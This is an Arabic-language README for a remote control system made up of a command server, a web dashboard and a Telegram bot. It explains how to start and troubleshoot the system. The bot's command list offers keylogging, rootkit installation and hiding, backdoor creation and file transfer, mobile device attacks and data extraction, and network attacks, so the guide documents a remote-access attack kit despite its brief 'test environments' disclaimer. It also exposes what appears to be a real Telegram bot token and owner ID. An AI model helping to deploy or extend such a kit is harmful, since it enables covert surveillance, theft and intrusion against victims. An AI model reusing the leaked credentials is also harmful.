# 🚀 نظام التحكم عن بعد المتقدم - دليل التشغيل

## 📋 نظرة عامة

هذا النظام يتكون من ثلاثة مكونات رئيسية:
- **خادم الأوامر** (Command Server): يعمل على المنفذ 10001
- **واجهة الويب** (Web Dashboard): تعمل على المنفذ 8081  
- **بوت تيليجرام** (Telegram Bot): يعمل في الخلفية

## 🛠️ متطلبات النظام

### المتطلبات الأساسية:
- Python 3.9+
- Node.js
- npm
- pyenv (اختياري - للتشغيل مع TensorFlow)

### التبعيات المطلوبة:
- Python: websockets, flask, psutil, python-nmap, scapy, paramiko, cryptography, adb-shell, numpy, pandas, scikit-learn, matplotlib, seaborn, asyncio, schedule, pyTelegramBotAPI, requests
- Node.js: (يتم تثبيتها تلقائياً)
- TensorFlow: (يتم تثبيته تلقائياً إذا كان pyenv متاح)

## 🚀 تشغيل النظام

### الطريقة الأولى: التشغيل التلقائي الكامل
```bash
# تشغيل النظام بأكمله
./run_system.sh start

# إيقاف النظام
./run_system.sh stop

# إعادة تشغيل النظام
./run_system.sh restart

# عرض حالة النظام
./run_system.sh status

# فحص متطلبات النظام
./run_system.sh check
```

### الطريقة الثانية: التشغيل من المجلد الرئيسي
```bash
# تشغيل النظام
./start_system.sh start

# إيقاف النظام
./start_system.sh stop

# عرض حالة النظام
./start_system.sh status
```

### الطريقة الثالثة: التشغيل من مجلد remote-control-system
```bash
cd remote-control-system
./start.sh
```

## 📊 وصول النظام

بعد تشغيل النظام، يمكنك الوصول إلى:

- **🌐 واجهة الويب**: http://localhost:8081
- **🔧 خادم الأوامر**: http://localhost:10001
- **🤖 بوت تيليجرام**: يعمل في الخلفية

## 📋 الأوامر المتاحة

### أوامر البوت:
```
🔑 /keylogger start|stop|data
🔧 /rootkit install|escalate|hide
🚪 /backdoor create|execute|transfer
💻 /system info|control|monitor
📱 /mobile attack|control|extract
🌐 /network scan|attack|monitor
```

### أوامر النظام:
```bash
# تشغيل النظام
./run_system.sh start

# إيقاف النظام
./run_system.sh stop

# إعادة تشغيل النظام
./run_system.sh restart

# عرض حالة النظام
./run_system.sh status

# فحص المتطلبات
./run_system.sh check

# عرض المساعدة
./run_system.sh help
```

## 📁 ملفات السجلات

السجلات موجودة في مجلد `logs/`:
- `logs/command-server.log` - سجلات خادم الأوامر
- `logs/web-interface.log` - سجلات واجهة الويب
- `logs/telegram-bot.log` - سجلات بوت تيليجرام

## 🔧 إعداد متغيرات البيئة

### لبوت تيليجرام:
```bash
export TELEGRAM_BOT_TOKEN='your_bot_token_here'
export TELEGRAM_OWNER_ID='your_user_id_here'
```

### تشغيل البوت مع التوكن المحدد:
```bash
TELEGRAM_BOT_TOKEN='7305811865:AAF_PKkBWEUw-QdLg1ee5Xp7oksTG6XGK8c' TELEGRAM_OWNER_ID='985612253' ./run_system.sh start
```

## 🛠️ استكشاف الأخطاء

### إذا لم يعمل TensorFlow:
```bash
# تثبيت pyenv
curl https://pyenv.run | bash

# إضافة pyenv إلى PATH
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc

# تثبيت Python 3.10
pyenv install 3.10.14
pyenv global 3.10.14

# إعادة تشغيل النظام
./run_system.sh restart
```

### إذا لم تعمل واجهة الويب:
```bash
# فحص المنفذ
netstat -tlnp | grep :8081

# إيقاف العملية على المنفذ
sudo kill -9 $(lsof -t -i:8081)

# إعادة تشغيل النظام
./run_system.sh restart
```

### إذا لم يعمل خادم الأوامر:
```bash
# فحص السجلات
tail -f logs/command-server.log

# فحص المنفذ
netstat -tlnp | grep :10001

# إعادة تشغيل النظام
./run_system.sh restart
```

## 📊 مراقبة النظام

### عرض العمليات النشطة:
```bash
ps aux | grep -E "(server.py|web_dashboard.py|bot.py)"
```

### عرض استخدام الموارد:
```bash
# استخدام الذاكرة
free -h

# استخدام المعالج
top

# استخدام القرص
df -h
```

### عرض السجلات في الوقت الفعلي:
```bash
# سجلات خادم الأوامر
tail -f logs/command-server.log

# سجلات واجهة الويب
tail -f logs/web-interface.log

# سجلات بوت تيليجرام
tail -f logs/telegram-bot.log
```

## 🔒 الأمان

- تأكد من تشغيل النظام في بيئة آمنة
- لا تشارك توكن البوت مع أي شخص
- استخدم جدار حماية لحماية المنافذ
- راقب السجلات بانتظام

## 📞 الدعم

إذا واجهت أي مشاكل:
1. تحقق من السجلات في مجلد `logs/`
2. تأكد من تثبيت جميع المتطلبات
3. تأكد من صحة متغيرات البيئة
4. أعد تشغيل النظام باستخدام `./run_system.sh restart`

## 🎯 ملاحظات مهمة

- النظام مصمم للاستخدام في بيئات اختبار آمنة
- تأكد من الحصول على الأذونات المطلوبة قبل استخدام أي ميزة
- راقب استخدام الموارد لتجنب استنزاف النظام
- احتفظ بنسخ احتياطية من البيانات المهمة